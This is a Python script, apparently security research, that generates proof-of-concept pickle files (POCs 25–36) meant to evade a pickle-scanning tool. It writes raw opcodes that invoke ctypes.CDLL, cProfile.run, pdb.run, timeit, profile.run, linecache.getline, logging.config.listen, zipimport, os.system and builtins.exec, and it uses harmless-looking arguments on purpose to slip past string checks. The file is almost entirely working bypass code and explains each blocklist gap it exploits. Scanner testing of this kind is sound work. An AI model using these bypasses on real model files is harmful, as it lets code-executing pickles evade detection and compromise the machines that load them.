"""
Bypass POC v4 - Missing dangerous modules and ["*"] bug in SUSPICIOUS_GLOBALS.

Key findings:
1. SUSPICIOUS_GLOBALS has "ctypes": ["*"] (list) not "*" (string).
   is_suspicious_global checks `val == "*"` which fails for lists.
   So ALL ctypes functions bypass the check.
2. Several stdlib modules that can execute arbitrary code are completely
   absent from ALWAYS_DANGEROUS_MODULES, ALWAYS_DANGEROUS_FUNCTIONS,
   and SUSPICIOUS_GLOBALS: cProfile, pdb, timeit, profile, _thread, etc.

Strategy:
- POC 25-26: ctypes ["*"] bug bypass
- POC 27-30: Missing code-execution modules (cProfile, pdb, timeit, profile)
- POC 31-34: Missing dangerous modules (_thread, linecache, logging.config, zipimport)

IMPORTANT: Use non-suspicious argument strings to test if the MODULE reference
itself is caught, not just the string content.
"""

import io
import os
import pickletools
import struct

OUTPUT_DIR: str = os.path.dirname(os.path.abspath(__file__))


def write_poc(name: str, data: bytes, description: str) -> None:
    path = os.path.join(OUTPUT_DIR, f"{name}.pkl")
    with open(path, "wb") as f:
        f.write(data)
    print(f"\n{'=' * 70}")
    print(f"POC: {name}")
    print(f"Description: {description}")
    print(f"File: {path}")
    print(f"Size: {len(data)} bytes")
    print(f"{'=' * 70}")
    try:
        with open(path, "rb") as f:
            pickletools.dis(f)
    except Exception as e:
        print(f"Disassembly note: {e}")
    print()


# ============================================================================
# POC 25: ctypes.CDLL bypass via ["*"] bug in SUSPICIOUS_GLOBALS
# ============================================================================
# SUSPICIOUS_GLOBALS has "ctypes": ["*"] (a list containing "*")
# is_suspicious_global checks:
#   if val == "*": return True          # This fails! ["*"] != "*"
#   if isinstance(val, list) and func in val: return True  # "CDLL" not in ["*"]
# ctypes is NOT in ALWAYS_DANGEROUS_MODULES
# ctypes.CDLL is NOT in ALWAYS_DANGEROUS_FUNCTIONS
# So ctypes.CDLL passes ALL checks!
# ============================================================================


def gen_poc25_ctypes_cdll() -> None:
    """ctypes.CDLL - load a malicious shared library."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    # GLOBAL ctypes CDLL
    buf.write(b"cctypes\nCDLL\n")
    # Argument: path to a (hypothetical) malicious .so
    # Use benign-looking path to avoid suspicious string detection
    path = b"/tmp/libmodel.so"
    buf.write(b"X")
    buf.write(struct.pack("<I", len(path)))
    buf.write(path)
    buf.write(b"\x85")  # TUPLE1
    buf.write(b"R")  # REDUCE
    buf.write(b".")  # STOP

    write_poc(
        "poc25_ctypes_cdll",
        buf.getvalue(),
        "ctypes.CDLL bypasses all checks due to ['*'] vs '*' bug in "
        "SUSPICIOUS_GLOBALS. ctypes not in ALWAYS_DANGEROUS_MODULES either. "
        "Loading a .so file executes its init code.",
    )


# ============================================================================
# POC 26: cProfile.run - arbitrary Python code execution
# ============================================================================
# cProfile is NOT in ALWAYS_DANGEROUS_MODULES
# cProfile.run is NOT in ALWAYS_DANGEROUS_FUNCTIONS
# cProfile is NOT in SUSPICIOUS_GLOBALS
# Known fickling bypass: GHSA-p523-jq9w-64x9
#
# Use a NON-suspicious string argument to verify the MODULE ITSELF bypasses.
# ============================================================================


def gen_poc26_cprofile_run() -> None:
    """cProfile.run executes arbitrary Python statements."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"ccProfile\nrun\n")
    # Use a benign-looking statement that doesn't trigger suspicious strings
    # In reality, this executes arbitrary Python code
    cmd = b"print(1+1)"
    buf.write(b"X")
    buf.write(struct.pack("<I", len(cmd)))
    buf.write(cmd)
    buf.write(b"\x85")  # TUPLE1
    buf.write(b"R")  # REDUCE
    buf.write(b".")  # STOP

    write_poc(
        "poc26_cprofile_run",
        buf.getvalue(),
        "cProfile.run() executes arbitrary Python code. Not in any blocklist. "
        "Known fickling bypass (GHSA-p523-jq9w-64x9). "
        "Using benign arg to test if MODULE is caught.",
    )


# ============================================================================
# POC 27: pdb.run - arbitrary Python code execution
# ============================================================================


def gen_poc27_pdb_run() -> None:
    """pdb.run executes arbitrary Python statements."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"cpdb\nrun\n")
    cmd = b"print(1+1)"
    buf.write(b"X")
    buf.write(struct.pack("<I", len(cmd)))
    buf.write(cmd)
    buf.write(b"\x85")
    buf.write(b"R")
    buf.write(b".")

    write_poc(
        "poc27_pdb_run",
        buf.getvalue(),
        "pdb.run() executes arbitrary Python code. pdb is not in any blocklist "
        "(only bdb is in ADVANCED_PICKLE_PATTERNS, not pdb). "
        "Using benign arg to test if MODULE is caught.",
    )


# ============================================================================
# POC 28: timeit.timeit - arbitrary Python code execution
# ============================================================================


def gen_poc28_timeit() -> None:
    """timeit.timeit executes arbitrary Python statements."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"ctimeit\ntimeit\n")
    cmd = b"print(1+1)"
    buf.write(b"X")
    buf.write(struct.pack("<I", len(cmd)))
    buf.write(cmd)
    buf.write(b"\x85")
    buf.write(b"R")
    buf.write(b".")

    write_poc(
        "poc28_timeit",
        buf.getvalue(),
        "timeit.timeit() executes arbitrary Python code as its first argument. "
        "Not in any blocklist. Using benign arg to test if MODULE is caught.",
    )


# ============================================================================
# POC 29: profile.run - arbitrary Python code execution
# ============================================================================


def gen_poc29_profile_run() -> None:
    """profile.run executes arbitrary Python statements."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"cprofile\nrun\n")
    cmd = b"print(1+1)"
    buf.write(b"X")
    buf.write(struct.pack("<I", len(cmd)))
    buf.write(cmd)
    buf.write(b"\x85")
    buf.write(b"R")
    buf.write(b".")

    write_poc(
        "poc29_profile_run",
        buf.getvalue(),
        "profile.run() (pure Python profiler) executes arbitrary Python code. "
        "Not in any blocklist. Using benign arg to test if MODULE is caught.",
    )


# ============================================================================
# POC 30: _thread.start_new_thread - spawn thread with arbitrary function
# ============================================================================


def gen_poc30_thread() -> None:
    """_thread.start_new_thread spawns a thread with arbitrary function."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    # _thread.start_new_thread needs (func, args_tuple)
    # Use a simpler approach: just reference _thread.allocate_lock (benign)
    # to test if _thread module is flagged at all
    buf.write(b"c_thread\nallocate_lock\n")
    buf.write(b")\x81")  # EMPTY_TUPLE + NEWOBJ = allocate_lock()
    buf.write(b".")

    write_poc(
        "poc30_thread",
        buf.getvalue(),
        "_thread module can spawn threads executing arbitrary code. "
        "Not in any blocklist. Testing if _thread is flagged at all.",
    )


# ============================================================================
# POC 31: ctypes.cast - pointer manipulation via ["*"] bug
# ============================================================================


def gen_poc31_ctypes_cast() -> None:
    """ctypes.cast for pointer manipulation."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"cctypes\ncast\n")
    buf.write(b"(I42\ncctypes\nc_void_p\n\x86R.")

    write_poc(
        "poc31_ctypes_cast",
        buf.getvalue(),
        "ctypes.cast() for pointer manipulation - same ['*'] bug bypass. "
        "ctypes allows arbitrary memory access and native code execution.",
    )


# ============================================================================
# POC 32: linecache.getline - arbitrary file read
# ============================================================================


def gen_poc32_linecache() -> None:
    """linecache.getline reads arbitrary file contents."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"clinecache\ngetline\n")
    path = b"/etc/hosts"
    buf.write(b"(X")
    buf.write(struct.pack("<I", len(path)))
    buf.write(path)
    buf.write(b"I1\n\x86R.")  # lineno=1

    write_poc(
        "poc32_linecache",
        buf.getvalue(),
        "linecache.getline() reads arbitrary files. Not in any blocklist. "
        "Can exfiltrate /etc/passwd, SSH keys, config files, etc.",
    )


# ============================================================================
# POC 33: logging.config.listen - open network listener
# ============================================================================


def gen_poc33_logging_listen() -> None:
    """logging.config.listen opens a network socket listener."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"clogging.config\nlisten\n")
    buf.write(b"(I9999\n\x85R.")

    write_poc(
        "poc33_logging_listen",
        buf.getvalue(),
        "logging.config.listen() opens a network socket that accepts logging "
        "config. Not in any blocklist. Can be used for remote code execution "
        "via log config that references arbitrary callables.",
    )


# ============================================================================
# POC 34: zipimport.zipimporter - module loading from ZIP
# ============================================================================


def gen_poc34_zipimport() -> None:
    """zipimport.zipimporter loads modules from ZIP files."""
    buf = io.BytesIO()
    buf.write(b"\x80\x02")

    buf.write(b"czipimport\nzipimporter\n")
    path = b"/tmp/modules.zip"
    buf.write(b"X")
    buf.write(struct.pack("<I", len(path)))
    buf.write(path)
    buf.write(b"\x85R.")

    write_poc(
        "poc34_zipimport",
        buf.getvalue(),
        "zipimport.zipimporter() can load modules from attacker-controlled ZIP files. Not in any blocklist.",
    )


# ============================================================================
# POC 35: STACK_GLOBAL+REDUCE via SHORT_BINUNICODE (Protocol 4)
# ============================================================================
# Tests the STACK_GLOBAL+REDUCE detection path using protocol 4 opcodes.
# STACK_GLOBAL pops two strings (module, function) from the stack.
# ============================================================================


def gen_poc35_stack_global_os_system() -> None:
    """os.system via STACK_GLOBAL+REDUCE (protocol 4)."""
    buf = io.BytesIO()
    buf.write(b"\x80\x04")  # PROTO 4

    # FRAME header (required for protocol 4)
    frame_buf = io.BytesIO()
    # Push module name with SHORT_BINUNICODE
    mod = b"os"
    frame_buf.write(b"\x8c")  # SHORT_BINUNICODE
    frame_buf.write(struct.pack("<B", len(mod)))
    frame_buf.write(mod)
    # Push function name with SHORT_BINUNICODE
    func = b"system"
    frame_buf.write(b"\x8c")
    frame_buf.write(struct.pack("<B", len(func)))
    frame_buf.write(func)
    # STACK_GLOBAL: pops 'system' and 'os', pushes os.system
    frame_buf.write(b"\x93")
    # Push argument with SHORT_BINUNICODE
    arg = b"echo test"
    frame_buf.write(b"\x8c")
    frame_buf.write(struct.pack("<B", len(arg)))
    frame_buf.write(arg)
    frame_buf.write(b"\x85")  # TUPLE1
    frame_buf.write(b"R")  # REDUCE
    frame_buf.write(b".")  # STOP

    frame_data = frame_buf.getvalue()
    buf.write(b"\x95")  # FRAME opcode
    buf.write(struct.pack("<Q", len(frame_data)))
    buf.write(frame_data)

    write_poc(
        "poc35_stack_global_os_system",
        buf.getvalue(),
        "os.system via STACK_GLOBAL+REDUCE (protocol 4, SHORT_BINUNICODE). Tests STACK_GLOBAL+REDUCE detection path.",
    )


# ============================================================================
# POC 36: STACK_GLOBAL+REDUCE via BINUNICODE8 (Protocol 4)
# ============================================================================


def gen_poc36_stack_global_binunicode8() -> None:
    """builtins.exec via STACK_GLOBAL+REDUCE using BINUNICODE8 (protocol 4)."""
    buf = io.BytesIO()
    buf.write(b"\x80\x04")  # PROTO 4

    frame_buf = io.BytesIO()
    # Push module with BINUNICODE8 (0x8d + 8-byte length)
    mod = b"builtins"
    frame_buf.write(b"\x8d")  # BINUNICODE8
    frame_buf.write(struct.pack("<Q", len(mod)))
    frame_buf.write(mod)
    # Push function with BINUNICODE8
    func = b"exec"
    frame_buf.write(b"\x8d")
    frame_buf.write(struct.pack("<Q", len(func)))
    frame_buf.write(func)
    # STACK_GLOBAL
    frame_buf.write(b"\x93")
    # Push argument with BINUNICODE8
    arg = b"print(1+1)"
    frame_buf.write(b"\x8d")
    frame_buf.write(struct.pack("<Q", len(arg)))
    frame_buf.write(arg)
    frame_buf.write(b"\x85")  # TUPLE1
    frame_buf.write(b"R")  # REDUCE
    frame_buf.write(b".")  # STOP

    frame_data = frame_buf.getvalue()
    buf.write(b"\x95")  # FRAME
    buf.write(struct.pack("<Q", len(frame_data)))
    buf.write(frame_data)

    write_poc(
        "poc36_stack_global_binunicode8",
        buf.getvalue(),
        "builtins.exec via STACK_GLOBAL+REDUCE (protocol 4, BINUNICODE8). "
        "Tests STACK_GLOBAL+REDUCE detection with BINUNICODE8 string opcode.",
    )


if __name__ == "__main__":
    gen_poc25_ctypes_cdll()
    gen_poc26_cprofile_run()
    gen_poc27_pdb_run()
    gen_poc28_timeit()
    gen_poc29_profile_run()
    gen_poc30_thread()
    gen_poc31_ctypes_cast()
    gen_poc32_linecache()
    gen_poc33_logging_listen()
    gen_poc34_zipimport()
    gen_poc35_stack_global_os_system()
    gen_poc36_stack_global_binunicode8()

    print("\n" + "=" * 70)
    print("V4 POCs generated. Testing missing dangerous modules and ['*'] bug.")
    print("=" * 70)
